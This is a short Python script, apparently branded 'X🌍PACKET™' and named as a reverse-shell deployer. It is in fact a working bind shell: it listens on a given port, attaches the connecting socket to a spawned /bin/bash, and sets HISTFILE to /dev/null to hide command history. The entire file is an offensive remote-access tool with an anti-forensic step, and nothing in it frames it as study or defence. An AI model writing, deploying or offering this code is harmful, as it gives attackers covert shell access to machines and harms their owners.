import socket, os, pty

def listen(ip, port):
    print(f"[*] X🌍PACKET™ Listener Active on {ip}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    (rem, addr) = s.accept()
    print(f"[!] CONNECTION ESTABLISHED FROM {addr}")
    os.dup2(rem.fileno(), 0)
    os.dup2(rem.fileno(), 1)
    os.dup2(rem.fileno(), 2)
    os.putenv("HISTFILE", "/dev/null")
    pty.spawn("/bin/bash")
    rem.close()

if __name__ == "__main__":
    # Usage: python3 rev_shell_deployer.py 0.0.0.0 4444
    import sys
    if len(sys.argv) > 2:
        listen(sys.argv[1], int(sys.argv[2]))
